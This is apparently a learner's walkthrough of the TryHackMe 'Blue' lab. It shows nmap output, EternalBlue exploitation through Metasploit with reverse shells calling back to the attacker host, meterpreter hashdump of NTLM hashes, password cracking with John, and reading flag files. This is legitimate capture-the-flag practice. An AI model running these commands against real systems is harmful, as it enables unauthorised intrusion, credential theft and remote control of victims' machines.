the result of nmap scan 
nmap -sC -sV 10.10.207.217

////////////////////////////////////////////

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 09:47 UTC
Nmap scan report for 10.10.207.217
Host is up (0.088s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-04-22T09:45:14
|_Not valid after:  2025-10-22T09:45:14
|_ssl-date: 2025-04-23T09:49:06+00:00; 0s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-23T04:48:49-05:00
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:91:0d:f4:55:6d (unknown)
| smb2-time: 
|   date: 2025-04-23T09:48:49
|_  start_date: 2025-04-23T09:45:12
|_clock-skew: mean: 1h15m00s, deviation: 2h30m01s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.03 seconds



/////////////////////////////////////////////

there are 3 ports open with a port number under 1000?

lets now figure whats the machine vulnerable to
//////////////////////////////

From the Nmap output:

445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1

This means:

    It's Windows 7 SP1 — an OS known to be vulnerable to EternalBlue if it's not patched.

    EternalBlue specifically targets Windows systems from XP to 7 and Server 2003 to 2008 R2, particularly those with SMBv1 enabled.



/////////////////////////////////////////

so it might be vulnerable to vulnerable to MS17-010 (EternalBlue)
which became eventually true 

now lets Start Metasploit


and 

Find the exploitation code we will run against the machine. 

lets type  search MS17-010 in msf 

the result 
//////////////////

msf6 > search MS17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption


/////////////////

so this is the path for the exploitation : exploit/windows/smb/ms17_010_eternalblue


///////////////////////////////////

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >


//////////////////////////////////////////////////////

Show options and set the one required value. What is the name of this value? (All caps for submission)


which is RHOSTS

////////////////////////////////////

lets set the payload : msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 


///////////////////////////////////////




the options 

msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.207.217    yes       The target host(s), see https://docs.metasploit
                                             .com/docs/using-metasploit/basics/using-metaspl
                                             oit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authen
                                             tication. Only affects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified usern
                                             ame
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Ta
                                             rget. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only
                                              affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process,
                                        none)
   LHOST     10.21.144.196    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.



//////////////////////////////////////////////


now i penetrated inside the machine 


///////////////////////////////////////////////


msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.21.144.196:4444 
[*] 10.10.207.217:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.207.217:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.207.217:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.207.217:445 - The target is vulnerable.
[*] 10.10.207.217:445 - Connecting to target for exploitation.
[+] 10.10.207.217:445 - Connection established for exploitation.
[+] 10.10.207.217:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.207.217:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.207.217:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.207.217:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.207.217:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.207.217:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.207.217:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.207.217:445 - Sending all but last fragment of exploit packet
[*] 10.10.207.217:445 - Starting non-paged pool grooming
[+] 10.10.207.217:445 - Sending SMBv2 buffers
[+] 10.10.207.217:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.207.217:445 - Sending final SMBv2 buffers.
[*] 10.10.207.217:445 - Sending last fragment of exploit packet!
[*] 10.10.207.217:445 - Receiving response from exploit packet
[+] 10.10.207.217:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.207.217:445 - Sending egg to corrupted connection.
[*] 10.10.207.217:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.207.217
[*] Command shell session 1 opened (10.21.144.196:4444 -> 10.10.207.217:49234) at 2025-04-23 10:30:22 +0000
[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.207.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
C:\Windows\system32>

/////////////////////////////////


now lets transforme the windows shell to meterpreter 

by typing sessions -u nb_of_session in the background 


////////////////////////////


msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.21.144.196:4433 
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
[*] Sending stage (203846 bytes) to 10.10.207.217
[*] Meterpreter session 4 opened (10.21.144.196:4433 -> 10.10.207.217:49251) at 2025-04-23 10:44:28 +0000
[*] Stopping exploit/multi/handler
Interrupt: use the 'exit' command to quit
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         shell x64/windows        Shell Banner: Microsoft Wi  10.21.144.196:4444 -> 10.10
                                     ndows [Version 6.1.7601] -  .207.217:49234 (10.10.207.2
                                     ----                        17)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
                                     PC                          .207.217:49245 (10.10.207.2
                                                                 17)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
                                     PC                          .207.217:49247 (10.10.207.2
                                                                 17)
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-  10.21.144.196:4433 -> 10.10
                                     PC                          .207.217:49251 (10.10.207.2
                                                                 17)

msf6 exploit(windows/smb/ms17_010_eternalblue) >


////////////////////////////////////////



now lets use one of the meterpreter sessions 


lets access it 

///////////////////////////////////////////



msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > 


/////////////////////////////////////////////


we can also use post module to upgrade a standard shell to a Meterpreter session in Metasploit is:

post/multi/manage/shell_to_meterpreter


//////////////////////////////


msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connecti
                                       on
   LHOST                     no        IP of host that will receive the connection from the p
                                       ayload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.


///////////////////////////////////////


all we need to do above is to change the session and maybe the lhost

Set the required option, you may need to list all of the sessions to find your target here.

sessions -l

Run! If this doesn't work, try completing the exploit from the previous task once more.

run (or exploit)


Once the meterpreter shell conversion completes, select that session for use.

sessions SESSION_NUMBER


Dump the non-default user's password and crack it!


Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so.   the name of the non-default user is : jon
///////////////////////////////

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >


//////////////////////////////////////////////


now lets crack the password of jhon 


Only this part of the hash is needed:

ffb43f0de35be4d9917ac0cc8ad57f8d

But John prefers the full format like this:

Jon:ffb43f0de35be4d9917ac0cc8ad57f8d

Or if you want to be extra sure John recognizes it, you can format it this way (called "NT format"):

Jon:$NT$ffb43f0de35be4d9917ac0cc8ad57f8d

i Created a file called hash.txt and put the line:

Jon:$NT$ffb43f0de35be4d9917ac0cc8ad57f8d


i Used the --format=nt option for NTLM hashes:

john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

the password is : alqfna22 ///////////


//////////////////

john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2025-04-23 11:18) 2.272g/s 23182Kp/s 23182Kc/s 23182KC/s alqueva1968..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

/////////////////


the first flag is in the systeme root 


////////////////////////////



meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:36 +0000  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 05:08:56 +0000  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 03:20:08 +0000  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 22:22:01 +0000  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 22:28:38 +0000  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 22:35:57 +0000  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:22 +0000  Recovery
040777/rwxrwxrwx  4096   dir   2025-04-23 10:09:42 +0000  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 03:13:28 +0000  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 22:36:30 +0000  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
000000/---------  0      fif   1970-01-01 00:00:00 +0000  hiberfil.sys
000000/---------  0      fif   1970-01-01 00:00:00 +0000  pagefile.sys

meterpreter > cat flag1.txt 
flag{access_the_machine}meterpreter >



/////////////////////////////////////

Flag2? This flag can be found at the location where passwords are stored within Windows.


if u google u will find that 

/////////////

Windows logon passwords are never stored in their original form and always encrypted. They are stored in C:/WINDOWS/SYSTEM32/config (Assuming windows installed in C drive) folder. Passwords are stored in files called sam files. But they are hashed and so encrypted.24‏/09‏/2017

///////////////



//////////////////////////////////



meterpreter > cd windows
meterpreter > pwd
C:\windows
meterpreter > cd System32\\
meterpreter > pwd
C:\windows\System32
meterpreter > cd config
meterpreter > pwd
C:\windows\System32\config
meterpreter > ls
Listing: C:\windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-12 23:00:40 +0000  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-12 23:00:40 +0000  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2025-04-23 09:55:26 +0000  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:10 +0000  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2025-04-23 09:55:26 +0000  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2025-04-23 09:45:56 +0000  COMPONENTS{016888b8-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TxR.0.regtrans-
                                                             ms
100666/rw-rw-rw-  1048576   fil   2025-04-23 09:45:56 +0000  COMPONENTS{016888b8-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TxR.1.regtrans-
                                                             ms
100666/rw-rw-rw-  1048576   fil   2025-04-23 09:45:56 +0000  COMPONENTS{016888b8-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TxR.2.regtrans-
                                                             ms
100666/rw-rw-rw-  65536     fil   2025-04-23 09:45:56 +0000  COMPONENTS{016888b8-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2018-12-13 03:20:57 +0000  COMPONENTS{016888b9-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2018-12-13 03:20:57 +0000  COMPONENTS{016888b9-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TMContainer0000
                                                             0000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 05:01:27 +0000  COMPONENTS{016888b9-6c6f-11de-8d
                                                             1d-001e0bcde3ec}.TMContainer0000
                                                             0000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2025-04-23 10:03:14 +0000  DEFAULT
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:10 +0000  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2025-04-23 10:03:14 +0000  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer0000000
                                                             0000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer0000000
                                                             0000000000002.regtrans-ms
040777/rwxrwxrwx  0         dir   2009-07-14 02:34:57 +0000  Journal
040777/rwxrwxrwx  4096      dir   2025-04-23 10:02:51 +0000  RegBack
100666/rw-rw-rw-  262144    fil   2019-03-17 20:05:08 +0000  SAM
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:10 +0000  SAM.LOG
100666/rw-rw-rw-  21504     fil   2019-03-17 22:39:12 +0000  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e
                                                             0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e
                                                             0bcde3ec}.TMContainer00000000000
                                                             000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SAM{016888c1-6c6f-11de-8d1d-001e
                                                             0bcde3ec}.TMContainer00000000000
                                                             000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2025-04-23 09:55:16 +0000  SECURITY
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:10 +0000  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2025-04-23 09:55:16 +0000  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TMContainer000000
                                                             00000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:22:17 +0000  SECURITY{016888c5-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TMContainer000000
                                                             00000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2025-04-23 11:15:04 +0000  SOFTWARE
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:10 +0000  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2025-04-23 11:15:04 +0000  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TMContainer000000
                                                             00000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:19 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d
                                                             -001e0bcde3ec}.TMContainer000000
                                                             00000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2025-04-23 11:24:18 +0000  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 08:32:06 +0000  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2025-04-23 11:24:18 +0000  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TMContainer00000000
                                                             000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 22:21:22 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TMContainer00000000
                                                             000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-12 23:03:05 +0000  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 19:32:48 +0000  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 02:41:37 +0000  systemprofile

meterpreter > cat flag2.txt 
flag{sam_database_elevated_access}meterpreter >




///////////////////////////////////////



the hint says You'll need to have elevated privileges to access this flag. 


so ill try to use hashdump again 

and acess the password of the administrator 


NB : i implemented a reverse shell also in meterpreter > upload /home/Abad/Desktop/work/tryhackme/blue/bluemeterpreter.exe
[*] Uploading  : /home/Abad/Desktop/work/tryhackme/blue/bluemeterpreter.exe -> bluemeterpreter.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/Abad/Desktop/work/tryhackme/blue/bluemeterpreter.exe -> bluemeterpreter.exe
[*] Completed  : /home/Abad/Desktop/work/tryhackme/blue/bluemeterpreter.exe -> bluemeterpreter.exe
meterpreter > ls
Listing: C:\


and triggered it using this cmnd : meterpreter > execute -f bluemeterpreter.exe
Process 2452 created.
meterpreter > 


then i got a meterpreter msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.21.144.196:4444 
[*] Sending stage (177734 bytes) to 10.10.33.125
[*] Meterpreter session 1 opened (10.21.144.196:4444 -> 10.10.33.125:49224) at 2025-04-23 12:22:12 +0000

meterpreter > ls
Listing: C:\

lets check who am i 

////////////////////

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


---
this is the highest privilege level on Windows — equivalent to root on Linux.

lets search for the flag 

/////////////////////

search -f flag3.txt

//////////////////

meterpreter > search -f flag3.txt
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-17 19:26:36 +0000


/////////////////////////////////////

lets access it 


////////////////////////



meterpreter > cd Users/Jon/
meterpreter > cd Documents\\
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 19:26:36 +0000  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}meterpreter >



////////////////////////////////

boom hhh that was challenging 


